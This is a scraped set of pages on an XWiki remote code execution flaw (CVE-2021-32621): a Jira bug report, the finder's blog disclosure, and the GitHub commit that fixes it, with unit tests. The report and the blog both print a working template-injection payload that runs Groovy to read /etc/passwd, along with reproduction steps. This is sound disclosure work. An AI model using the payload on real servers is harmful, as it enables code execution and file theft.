=== Content from jira.xwiki.org_8dc00afb_20250115_080106.html ===


[Log in](/login.jsp?os_destination=%2Fbrowse%2FXWIKI-17794)[Skip to main content](#main)[Skip to sidebar](#sidebar)Linked ApplicationsLoading…[![XWiki.org JIRA](/s/-65z3d2/930000/8ws80b/_/jira-logo-scaled.png)](https://jira.xwiki.org/secure/MyJiraHome.jspa)

* [Dashboards](/secure/Dashboard.jspa "View and manage your dashboards")
* [Projects](/secure/BrowseProjects.jspa "View recent projects and browse a list of projects")
* [Issues](/issues/ "Search for issues and view recent issues")

* Give feedback to Atlassian
* [Help](https://docs.atlassian.com/jira/jcore-docs-093/ "Help")
  + [Jira Core help](https://docs.atlassian.com/jira/jcore-docs-093/ "Go to the online documentation for Jira Core")
  + [Keyboard Shortcuts](/secure/ViewKeyboardShortcuts%21default.jspa "Get more information about Jira's Keyboard Shortcuts")
  + [About Jira](/secure/AboutPage.jspa "Get more information about Jira")
  + [Jira Credits](/secure/credits/AroundTheWorld%21default.jspa "See who did what")
* [Log In](/login.jsp?os_destination=%2Fbrowse%2FXWIKI-17794)

![Uploaded image for project: 'XWiki Platform'](https://jira.xwiki.org/secure/projectavatar?pid=10010&avatarId=13602)

1. [XWiki Platform](/browse/XWIKI)
2. [XWIKI-17794](/browse/XWIKI-17794)

# RCE via Gadget title

[Log In](/login.jsp?os_destination=%2Fbrowse%2FXWIKI-17794 "Log In")ClosedExportnull

XMLWordPrintable
#### Details

* **Type:**
  ![](/secure/viewavatar?size=xsmall&avatarId=13503&avatarType=issuetype "Bug - A problem which impairs or prevents the functions of the product.") Bug
* **Resolution:**
  Fixed
* **Priority:**
  ![](/images/icons/priorities/critical.svg "Critical - Crashes, loss of data, severe memory leak.") Critical
* **Fix Version/s:**
  [12.6.7](/issues/?jql=project+%3D+XWIKI+AND+fixVersion+%3D+12.6.7 "12.6.7 "), [12.10.3](/issues/?jql=project+%3D+XWIKI+AND+fixVersion+%3D+12.10.3 "12.10.3 "), [13.0](/issues/?jql=project+%3D+XWIKI+AND+fixVersion+%3D+13.0 "13.0 ")
* **Affects Version/s:**
  11.10.10
* **Component/s:**
  [Dashboard](/issues/?jql=project+%3D+XWIKI+AND+component+%3D+Dashboard "Dashboard ")
* **Labels:**
  + [attack\_xss](/issues/?jql=labels+%3D+attack_xss "attack_xss")
  + [attacker\_edit](/issues/?jql=labels+%3D+attacker_edit "attacker_edit")
  + [security](/issues/?jql=labels+%3D+security "security")
* **Environment:**
  <http://playground.xwiki.org/>

* **Tests:**
  Unit
* **Difficulty:**
  Unknown
* **Documentation:**
  N/A
* **Documentation in Release Notes:**
  N/A
* **Similar issues:**

#### Description

Registered users are able to execute server side code via gadget title.

Full path to reproduce:

1) Create new user on <http://playground.xwiki.org/> (or run locally using latest docker image)

2) Go to profile -> Edit -> My dashboard -> Add gadget

3) Choose any gadget (e.g. content or python).

4) Paste following payload into title:

*$request.getServletContext().getAttribute("org.apache.tomcat.InstanceManager").newInstance("javax.script.ScriptEngineManager").getEngineByName("groovy").eval("new File('/etc/passwd').text")*

5) Submit the gadget

**Expected behaviour:** User is unable to execute server side code.

**Actual behaviour:** User can execute server side code.

#### Attachments

#### Attachments

* Options
  + [Sort By Name](/browse/XWIKI-17794?attachmentSortBy=fileName#attachmentmodule "viewissue.subtasks.tab.show.all.name")
  + [Sort By Date](/browse/XWIKI-17794?attachmentSortBy=dateTime#attachmentmodule "Sort By Date")
  + [Ascending](/browse/XWIKI-17794?attachmentOrder=asc#attachmentmodule "Ascending")
  + [Descending](/browse/XWIKI-17794?attachmentOrder=desc#attachmentmodule "Descending")
  + [Thumbnails](/browse/XWIKI-17794?attachmentViewMode=gallery#attachmentmodule "Thumbnails")
  + [List](/browse/XWIKI-17794?attachmentViewMode=list#attachmentmodule "List")
  + [Download All](/secure/attachmentzip/64490.zip "Download all attachments as a ZIP file")

1. [![local_11_10_10.png](https://jira.xwiki.org/secure/thumbnail/38394/_thumb_38394.png)](/secure/attachment/38394/local_11_10_10.png "local_11_10_10.png - Latest 18/Sep/20 10:38 - Grigorii Liullin")[local\_11\_10\_10.png](/secure/attachment/38394/local_11_10_10.png "local_11_10_10.png - Latest 18/Sep/20 10:38 - Grigorii Liullin")751 kB18/Sep/20 10:38
2. [![local_12_7_1.png](https://jira.xwiki.org/secure/thumbnail/38395/_thumb_38395.png)](/secure/attachment/38395/local_12_7_1.png "local_12_7_1.png - Latest 18/Sep/20 11:19 - Grigorii Liullin")[local\_12\_7\_1.png](/secure/attachment/38395/local_12_7_1.png "local_12_7_1.png - Latest 18/Sep/20 11:19 - Grigorii Liullin")1015 kB18/Sep/20 11:19
3. [![rce_gadget_title_playground_xwiki_org.png](https://jira.xwiki.org/secure/thumbnail/38370/_thumb_38370.png)](/secure/attachment/38370/rce_gadget_title_playground_xwiki_org.png "rce_gadget_title_playground_xwiki_org.png - Latest 14/Sep/20 12:59 - Grigorii Liullin")[rce\_gadget\_title\_playground\_xwiki\_org.png](/secure/attachment/38370/rce_gadget_title_playground_xwiki_org.png "rce_gadget_title_playground_xwiki_org.png - Latest 14/Sep/20 12:59 - Grigorii Liullin")1.26 MB14/Sep/20 12:59
4. [![script_right_title_execution.png](https://jira.xwiki.org/secure/thumbnail/38396/_thumb_38396.png)](/secure/attachment/38396/script_right_title_execution.png "script_right_title_execution.png - Latest 18/Sep/20 11:57 - Grigorii Liullin")[script\_right\_title\_execution.png](/secure/attachment/38396/script_right_title_execution.png "script_right_title_execution.png - Latest 18/Sep/20 11:57 - Grigorii Liullin")833 kB18/Sep/20 11:57
5. [![script_right.png](https://jira.xwiki.org/secure/thumbnail/38397/_thumb_38397.png)](/secure/attachment/38397/script_right.png "script_right.png - Latest 18/Sep/20 11:57 - Grigorii Liullin")[script\_right.png](/secure/attachment/38397/script_right.png "script_right.png - Latest 18/Sep/20 11:57 - Grigorii Liullin")202 kB18/Sep/20 11:57
6. [![user_with_script_and_program.png](https://jira.xwiki.org/secure/thumbnail/38398/_thumb_38398.png)](/secure/attachment/38398/user_with_script_and_program.png "user_with_script_and_program.png - Latest 18/Sep/20 12:43 - Grigorii Liullin")[user\_with\_script\_and\_program.png](/secure/attachment/38398/user_with_script_and_program.png "user_with_script_and_program.png - Latest 18/Sep/20 12:43 - Grigorii Liullin")567 kB18/Sep/20 12:43
7. [![user_with_script_without_program.png](https://jira.xwiki.org/secure/thumbnail/38399/_thumb_38399.png)](/secure/attachment/38399/user_with_script_without_program.png "user_with_script_without_program.png - Latest 18/Sep/20 12:43 - Grigorii Liullin")[user\_with\_script\_without\_program.png](/secure/attachment/38399/user_with_script_without_program.png "user_with_script_without_program.png - Latest 18/Sep/20 12:43 - Grigorii Liullin")509 kB18/Sep/20 12:43
8. [![xwiki_rce_gadget_title_as_admin.png](https://jira.xwiki.org/secure/thumbnail/38368/_thumb_38368.png)](/secure/attachment/38368/xwiki_rce_gadget_title_as_admin.png "xwiki_rce_gadget_title_as_admin.png - Latest 14/Sep/20 12:59 - Grigorii Liullin")[xwiki\_rce\_gadget\_title\_as\_admin.png](/secure/attachment/38368/xwiki_rce_gadget_title_as_admin.png "xwiki_rce_gadget_title_as_admin.png - Latest 14/Sep/20 12:59 - Grigorii Liullin")1.08 MB14/Sep/20 12:59
9. [![xwiki_rce_gadget_title_as_user.png](https://jira.xwiki.org/secure/thumbnail/38369/_thumb_38369.png)](/secure/attachment/38369/xwiki_rce_gadget_title_as_user.png "xwiki_rce_gadget_title_as_user.png - Latest 14/Sep/20 12:59 - Grigorii Liullin")[xwiki\_rce\_gadget\_title\_as\_user.png](/secure/attachment/38369/xwiki_rce_gadget_title_as_user.png "xwiki_rce_gadget_title_as_user.png - Latest 14/Sep/20 12:59 - Grigorii Liullin")1.22 MB14/Sep/20 12:59
#### Issue Links

is related to

![Bug - A problem which impairs or prevents the functions of the product.](/secure/viewavatar?size=xsmall&avatarId=13503&avatarType=issuetype "Bug - A problem which impairs or prevents the functions of the product.")
[XWIKI-14247](/browse/XWIKI-14247)
User without scripting rights can execute velocity/python scripts through velocity/python gadgets in Dashboard WebHome and User Profile dashboard.

* ![Major - Major loss of function.](/images/icons/priorities/major.svg "Major - Major loss of function.")
* Closed

links to

![Web Link](https://github.com/favicon.ico "Web Link")
[Github security advisory](https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-h353-hc43-95vc)

#### Activity

#### People

Assignee:

![surli](https://jira.xwiki.org/secure/useravatar?size=small&avatarId=10222)
Simon Urli

Reporter:

![jay_from_future](https://jira.xwiki.org/secure/useravatar?size=small&avatarId=10222)
Grigorii Liullin

Votes:
0
Vote for this issue

Watchers:
5
Start watching this issue

#### Dates

Created:

14/Sep/20 13:00

Updated:

12/Jul/23 09:26

Resolved:

12/Jan/21 16:37

Date of First Response:

17/Sep/20 6:19 PM

* Atlassian Jira [Project Management Software](https://www.atlassian.com/software/jira)
* [About Jira](/secure/AboutPage.jspa/secure/AboutPage.jspa)
* [Report a problem](/secure/CreateIssue%21default.jspa)

Powered by a free Atlassian [Jira](http://www.atlassian.com/software/jira) open source license for XWiki.org. Try Jira - [bug tracking software](http://www.atlassian.com/software/jira) for *your* team.

[Atlassian](http://www.atlassian.com/)



=== Content from jay-from-future.github.io_ceb7d579_20250115_080105.html ===

[Jay From Future's Blog (but not about future or futures)](/)

[About](/about/)

# XWiki Platform RCE via gadget titles in the dashboard (CVE-2021-32621)

Jun 17, 2021

It all started with [Users with SCRIPT right can access the application server instance manager and create arbitrary Java objects through $request binding](https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-7qw5-pqhc-xm4g). I tried other fields where similar payload for Server-Side Template Injection could work and found one more.

## Short description:

Registered users are able to execute server side code via gadget title (Server-Side Template Injection).

## Links:

* [Script injection without script or programming rights through Gadget titles](https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-h353-hc43-95vc)
* [XWIKI-17794](https://jira.xwiki.org/browse/XWIKI-17794)
* [CVE-2021-32621](https://nvd.nist.gov/vuln/detail/CVE-2021-32621)

## Details:

Full path to reproduce:

1. Open XWiki platform (I used http://playground.xwiki.org/ and local installation using docker image)
2. Go to profile -> Edit -> My dashboard -> Add gadget
3. Choose any gadget (e.g. content or python).
4. Paste following payload into title (one line): `$request.getServletContext().getAttribute("org.apache.tomcat.InstanceManager")
   .newInstance("javax.script.ScriptEngineManager").getEngineByName("groovy").eval("new File('/etc/passwd').text")`
5. Submit the gadget

[![rce_gadget_title_playground_xwiki_org](/images/rce_gadget_title_playground_xwiki_org.png)](/images/rce_gadget_title_playground_xwiki_org.png)

Fix in source code: [XWIKI-17794: Properly interpret velocity in gadget titles](https://github.com/xwiki/xwiki-platform/commit/bb7068bd911f91e5511f3cfb03276c7ac81100bc). So now evaluation of title is wrapped with check for user right ‘SCRIPT’.

## Timeline:

1. 14 Sep 2020 - reported to XWiki team
2. 12 Jan 2021 - confirmed and fixed
3. 18 May 2021 - published
4. 28 May 2021 - CVE assigned

## Acknowledgement

Thanks to [d4d](https://twitter.com/d4d89704243) for helping with working payload.

## Jay From Future's Blog (but not about future or futures)

* Jay From Future's Blog (but not about future or futures)
* jay.from.future@gmail.com

* [jay-from-future](https://github.com/jay-from-future)

Dark times lie ahead of us and there will be a time when we must choose between what is easy and what is right. (Albus Dumbledore, Harry Potter and the Goblet of Fire)



=== Content from github.com_487e8691_20250115_080103.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fxwiki%2Fxwiki-platform%2Fcommit%2Fbb7068bd911f91e5511f3cfb03276c7ac81100bc)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fxwiki%2Fxwiki-platform%2Fcommit%2Fbb7068bd911f91e5511f3cfb03276c7ac81100bc)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=xwiki%2Fxwiki-platform)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[xwiki](/xwiki)
/
**[xwiki-platform](/xwiki/xwiki-platform)**
Public

* [Notifications](/login?return_to=%2Fxwiki%2Fxwiki-platform) You must be signed in to change notification settings
* [Fork
  554](/login?return_to=%2Fxwiki%2Fxwiki-platform)
* [Star
   1k](/login?return_to=%2Fxwiki%2Fxwiki-platform)

* [Code](/xwiki/xwiki-platform)
* [Pull requests
  139](/xwiki/xwiki-platform/pulls)
* [Actions](/xwiki/xwiki-platform/actions)
* [Projects
  0](/xwiki/xwiki-platform/projects)
* [Security](/xwiki/xwiki-platform/security)
* [Insights](/xwiki/xwiki-platform/pulse)

Additional navigation options

* [Code](/xwiki/xwiki-platform)
* [Pull requests](/xwiki/xwiki-platform/pulls)
* [Actions](/xwiki/xwiki-platform/actions)
* [Projects](/xwiki/xwiki-platform/projects)
* [Security](/xwiki/xwiki-platform/security)
* [Insights](/xwiki/xwiki-platform/pulse)

## Commit

[Permalink](/xwiki/xwiki-platform/commit/bb7068bd911f91e5511f3cfb03276c7ac81100bc)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

XWIKI-17794: Properly interpret velocity in gadget titles

[Browse files](/xwiki/xwiki-platform/tree/bb7068bd911f91e5511f3cfb03276c7ac81100bc)
Browse the repository at this point in the history

* Loading branch information

[![@surli](https://avatars.githubusercontent.com/u/1478232?s=40&v=4)](/surli)

[surli](/xwiki/xwiki-platform/commits?author=surli "View all commits by surli")
committed
Jan 12, 2021

1 parent
[5308f7d](/xwiki/xwiki-platform/commit/5308f7d8cdb5c61e8ae29c53fcc8075cfc6576fb)

commit bb7068b

 Show file tree

 Hide file tree

Showing
**2 changed files**
with
**79 additions**
and
**21 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* xwiki-platform-core/xwiki-platform-dashboard/xwiki-platform-dashboard-macro/src

  + main/java/org/xwiki/rendering/internal/macro/dashboard

    - xwiki-platform-core/xwiki-platform-dashboard/xwiki-platform-dashboard-macro/src/main/java/org/xwiki/rendering/internal/macro/dashboard/DefaultGadgetSource.java
      [DefaultGadgetSource.java](#diff-019101434580396fe1ee37f68fbad5da57dd48f40f4b9c40c0f9cf38c00001af)
  + test/java/org/xwiki/rendering/internal/macro/dashboard

    - xwiki-platform-core/xwiki-platform-dashboard/xwiki-platform-dashboard-macro/src/test/java/org/xwiki/rendering/internal/macro/dashboard/DefaultGadgetSourceTest.java
      [DefaultGadgetSourceTest.java](#diff-eb6c675af8005dd5178604d6e63b49b1a7ba420757476e9a28ad22fc6ba8a5da)

## There are no files selected for viewing

38 changes: 28 additions & 10 deletions

38
[...macro/src/main/java/org/xwiki/rendering/internal/macro/dashboard/DefaultGadgetSource.java](#diff-019101434580396fe1ee37f68fbad5da57dd48f40f4b9c40c0f9cf38c00001af "xwiki-platform-core/xwiki-platform-dashboard/xwiki-platform-dashboard-macro/src/main/java/org/xwiki/rendering/internal/macro/dashboard/DefaultGadgetSource.java")

Show comments

[View file](/xwiki/xwiki-platform/blob/bb7068bd911f91e5511f3cfb03276c7ac81100bc/xwiki-platform-core/xwiki-platform-dashboard/xwiki-platform-dashboard-macro/src/main/java/org/xwiki/rendering/internal/macro/dashboard/DefaultGadgetSource.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -44,17 +44,16 @@ |
|  |  | import org.xwiki.rendering.block.WordBlock; |
|  |  | import org.xwiki.rendering.block.XDOM; |
|  |  | import org.xwiki.rendering.executor.ContentExecutor; |
|  |  | import org.xwiki.rendering.executor.ContentExecutorException; |
|  |  | import org.xwiki.rendering.listener.reference.ResourceReference; |
|  |  | import org.xwiki.rendering.listener.reference.ResourceType; |
|  |  | import org.xwiki.rendering.macro.dashboard.Gadget; |
|  |  | import org.xwiki.rendering.macro.dashboard.GadgetSource; |
|  |  | import org.xwiki.rendering.parser.MissingParserException; |
|  |  | import org.xwiki.rendering.parser.ParseException; |
|  |  | import org.xwiki.rendering.syntax.Syntax; |
|  |  | import org.xwiki.rendering.transformation.MacroTransformationContext; |
|  |  | import org.xwiki.rendering.util.ParserUtils; |
|  |  | import org.xwiki.security.authorization.AuthorExecutor; |
|  |  | import org.xwiki.security.authorization.AuthorizationManager; |
|  |  | import org.xwiki.security.authorization.Right; |
|  |  | import org.xwiki.velocity.VelocityEngine; |
|  |  | import org.xwiki.velocity.VelocityManager; |
|  |  |  |
| Expand Down  Expand Up | | @@ -120,6 +119,9 @@ public class DefaultGadgetSource implements GadgetSource |
|  |  | @Inject |
|  |  | private JobProgressManager progress; |
|  |  |  |
|  |  | @Inject |
|  |  | private AuthorizationManager authorizationManager; |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Prepare the parser to parse the title and content of the gadget into blocks. |
|  |  | \*/ |
| Expand Down  Expand Up | | @@ -194,19 +196,23 @@ private List<Gadget> prepareGadgets(List<BaseObject> objects, Syntax sourceSynta |
|  |  | String position = xObject.getStringValue("position"); |
|  |  | String id = xObject.getNumber() + ""; |
|  |  |  |
|  |  | // render title with velocity |
|  |  | StringWriter writer = new StringWriter(); |
|  |  | // FIXME: the engine has an issue with $ and # as last character. To test and fix if it happens |
|  |  | velocityEngine.evaluate(velocityContext, writer, key, title); |
|  |  | String gadgetTitle = writer.toString(); |
|  |  | String gadgetTitle; |
|  |  |  |
|  |  | XWikiDocument ownerDocument = xObject.getOwnerDocument(); |
|  |  | if (this.authorizationManager.hasAccess(Right.SCRIPT, ownerDocument.getAuthorReference(), ownerDocument.getDocumentReference())) { |
|  |  | gadgetTitle = |
|  |  | this.evaluateVelocityTitle(velocityContext, velocityEngine, key, title, ownerDocument); |
|  |  | } else { |
|  |  | gadgetTitle = title; |
|  |  | } |
|  |  |  |
|  |  | // parse both the title and content in the syntax of the transformation context |
|  |  | List<Block> titleBlocks = |
|  |  | renderGadgetProperty(gadgetTitle, sourceSyntax, xObject.getDocumentReference(), |
|  |  | xObject.getOwnerDocument(), context); |
|  |  | ownerDocument, context); |
|  |  | List<Block> contentBlocks = |
|  |  | renderGadgetProperty(content, sourceSyntax, xObject.getDocumentReference(), |
|  |  | xObject.getOwnerDocument(), context); |
|  |  | ownerDocument, context); |
|  |  |  |
|  |  | // create a gadget will all these and add the gadget to the container of gadgets |
|  |  | Gadget gadget = new Gadget(id, titleBlocks, contentBlocks, position); |
| Expand All | | @@ -222,6 +228,18 @@ private List<Gadget> prepareGadgets(List<BaseObject> objects, Syntax sourceSynta |
|  |  | return gadgets; |
|  |  | } |
|  |  |  |
|  |  | private String evaluateVelocityTitle(VelocityContext velocityContext, VelocityEngine velocityEngine, String key, |
|  |  | String title, XWikiDocument ownerDocument) throws Exception |
|  |  | { |
|  |  | return this.authorExecutor.call(() -> { |
|  |  | // render title with velocity |
|  |  | StringWriter writer = new StringWriter(); |
|  |  | // FIXME: the engine has an issue with $ and # as last character. To test and fix if it happens |
|  |  | velocityEngine.evaluate(velocityContext, writer, key, title); |
|  |  | return writer.toString(); |
|  |  | }, ownerDocument.getAuthorReference(), ownerDocument.getDocumentReference()); |
|  |  | } |
|  |  |  |
|  |  | private List<Block> renderGadgetProperty(String content, Syntax sourceSyntax, EntityReference sourceReference, |
|  |  | XWikiDocument ownerDocument, MacroTransformationContext context) |
|  |  | throws Exception |
| Expand Down | |  |

62 changes: 51 additions & 11 deletions

62
[...o/src/test/java/org/xwiki/rendering/internal/macro/dashboard/DefaultGadgetSourceTest.java](#diff-eb6c675af8005dd5178604d6e63b49b1a7ba420757476e9a28ad22fc6ba8a5da "xwiki-platform-core/xwiki-platform-dashboard/xwiki-platform-dashboard-macro/src/test/java/org/xwiki/rendering/internal/macro/dashboard/DefaultGadgetSourceTest.java")

Show comments

[View file](/xwiki/xwiki-platform/blob/bb7068bd911f91e5511f3cfb03276c7ac81100bc/xwiki-platform-core/xwiki-platform-dashboard/xwiki-platform-dashboard-macro/src/test/java/org/xwiki/rendering/internal/macro/dashboard/DefaultGadgetSourceTest.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -41,6 +41,8 @@ |
|  |  | import org.xwiki.rendering.transformation.MacroTransformationContext; |
|  |  | import org.xwiki.rendering.transformation.TransformationContext; |
|  |  | import org.xwiki.security.authorization.AuthorExecutor; |
|  |  | import org.xwiki.security.authorization.AuthorizationManager; |
|  |  | import org.xwiki.security.authorization.Right; |
|  |  | import org.xwiki.test.junit5.mockito.ComponentTest; |
|  |  | import org.xwiki.test.junit5.mockito.InjectMockComponents; |
|  |  | import org.xwiki.test.junit5.mockito.MockComponent; |
| Expand All | | @@ -57,6 +59,7 @@ |
|  |  | import static org.mockito.ArgumentMatchers.any; |
|  |  | import static org.mockito.ArgumentMatchers.eq; |
|  |  | import static org.mockito.Mockito.mock; |
|  |  | import static org.mockito.Mockito.verify; |
|  |  | import static org.mockito.Mockito.when; |
|  |  |  |
|  |  | @ComponentTest |
| Expand All | | @@ -72,6 +75,9 @@ class DefaultGadgetSourceTest |
|  |  | @MockComponent |
|  |  | private AuthorExecutor authorExecutor; |
|  |  |  |
|  |  | @MockComponent |
|  |  | private AuthorizationManager authorizationManager; |
|  |  |  |
|  |  | @Mock |
|  |  | private DocumentReference documentReference; |
|  |  |  |
| Expand Down  Expand Up | | @@ -99,6 +105,11 @@ class DefaultGadgetSourceTest |
|  |  | @Mock |
|  |  | private MacroTransformationContext macroTransformationContext; |
|  |  |  |
|  |  | @Mock |
|  |  | private VelocityEngine velocityEngine; |
|  |  |  |
|  |  | private ContentExecutor<MacroTransformationContext> contentExecutor; |
|  |  |  |
|  |  | @BeforeEach |
|  |  | void setup(MockitoComponentManager componentManager) throws Exception |
|  |  | { |
| Expand All | | @@ -123,23 +134,14 @@ void setup(MockitoComponentManager componentManager) throws Exception |
|  |  | when(transformationContext.getId()).thenReturn(transformationId); |
|  |  |  |
|  |  | VelocityManager velocityManager = componentManager.getInstance(VelocityManager.class); |
|  |  | VelocityEngine velocityEngine = mock(VelocityEngine.class); |
|  |  | when(velocityManager.getVelocityEngine()).thenReturn(velocityEngine); |
|  |  | when(velocityEngine.evaluate(any(), any(), any(), any(String.class))).then((Answer<Void>) invocation -> { |
|  |  | Object[] args = invocation.getArguments(); |
|  |  | StringWriter stringWriter = (StringWriter) args[1]; |
|  |  | String title = (String) args[3]; |
|  |  | stringWriter.append(title); |
|  |  | return null; |
|  |  | }); |
|  |  |  |
|  |  | AuthorExecutor authorExecutor = componentManager.getInstance(AuthorExecutor.class); |
|  |  | when(authorExecutor.call(any(), eq(ownerAuthorReference), eq(ownerSourceReference))).then(invocationOnMock -> { |
|  |  | Callable callable = (Callable) invocationOnMock.getArguments()[0]; |
|  |  | return callable.call(); |
|  |  | }); |
|  |  |  |
|  |  | ContentExecutor<MacroTransformationContext> contentExecutor = |
|  |  | this.contentExecutor = |
|  |  | componentManager.getInstance(ContentExecutor.TYPE\_MACRO\_TRANSFORMATION); |
|  |  | when(contentExecutor.execute(any(), any(), any(), any())).then((Answer<XDOM>) invocationOnMock -> { |
|  |  | String content = invocationOnMock.getArgument(0); |
| Expand All | | @@ -162,12 +164,50 @@ void getGadgets() throws Exception |
|  |  | when(gadgetObject1.getLargeStringValue("content")).thenReturn("Some content"); |
|  |  | when(gadgetObject1.getStringValue("position")).thenReturn("0"); |
|  |  | when(gadgetObject1.getNumber()).thenReturn(42); |
|  |  | when(this.authorizationManager.hasAccess(Right.SCRIPT, ownerAuthorReference, ownerSourceReference)).thenReturn(true); |
|  |  | when(this.velocityEngine.evaluate(any(), any(), any(), eq("Gadget 1"))).then((Answer<Void>) invocation -> { |
|  |  | Object[] args = invocation.getArguments(); |
|  |  | StringWriter stringWriter = (StringWriter) args[1]; |
|  |  | String title = "Evaluated velocity version of gadget 1"; |
|  |  | stringWriter.append(title); |
|  |  | return null; |
|  |  | }); |
|  |  |  |
|  |  | List<Gadget> gadgets = this.defaultGadgetSource.getGadgets(testSource, macroTransformationContext); |
|  |  | assertEquals(1, gadgets.size()); |
|  |  | Gadget gadget = gadgets.get(0); |
|  |  | assertEquals("Gadget 1", gadget.getTitle().get(0).toString()); |
|  |  | assertEquals("Evaluated velocity version of gadget 1", gadget.getTitle().get(0).toString()); |
|  |  | assertEquals("Some content", gadget.getContent().get(0).toString()); |
|  |  | assertEquals("42", gadget.getId()); |
|  |  | verify(this.contentExecutor) |
|  |  | .execute(eq("Evaluated velocity version of gadget 1"), any(), any(), any()); |
|  |  | verify(this.contentExecutor) |
|  |  | .execute(eq("Some content"), any(), any(), any()); |
|  |  | } |
|  |  |  |
|  |  | @Test |
|  |  | void getGadgetWithoutScriptRight() throws Exception |
|  |  | { |
|  |  | assertEquals(new ArrayList<>(), this.defaultGadgetSource.getGadgets(testSource, macroTransformationContext)); |
|  |  |  |
|  |  | BaseObject gadgetObject1 = mock(BaseObject.class); |
|  |  | when(xWikiDocument.getXObjects(gadgetClassReference)).thenReturn(Collections.singletonList(gadgetObject1)); |
|  |  | when(gadgetObject1.getOwnerDocument()).thenReturn(ownerDocument); |
|  |  | when(gadgetObject1.getStringValue("title")).thenReturn("Gadget 2"); |
|  |  | when(gadgetObject1.getLargeStringValue("content")).thenReturn("Some other content"); |
|  |  | when(gadgetObject1.getStringValue("position")).thenReturn("2"); |
|  |  | when(gadgetObject1.getNumber()).thenReturn(12); |
|  |  | when(this.authorizationManager.hasAccess(Right.SCRIPT, ownerAuthorReference, ownerSourceReference)).thenReturn(false); |
|  |  |  |
|  |  | List<Gadget> gadgets = this.defaultGadgetSource.getGadgets(testSource, macroTransformationContext); |
|  |  | assertEquals(1, gadgets.size()); |
|  |  | Gadget gadget = gadgets.get(0); |
|  |  | assertEquals("Gadget 2", gadget.getTitle().get(0).toString()); |
|  |  | assertEquals("Some other content", gadget.getContent().get(0).toString()); |
|  |  | assertEquals("12", gadget.getId()); |
|  |  | verify(this.contentExecutor) |
|  |  | .execute(eq("Gadget 2"), any(), any(), any()); |
|  |  | verify(this.contentExecutor) |
|  |  | .execute(eq("Some other content"), any(), any(), any()); |
|  |  | } |
|  |  | } |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `bb7068b`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fxwiki%2Fxwiki-platform%2Fcommit%2Fbb7068bd911f91e5511f3cfb03276c7ac81100bc) to comment.

## Footer

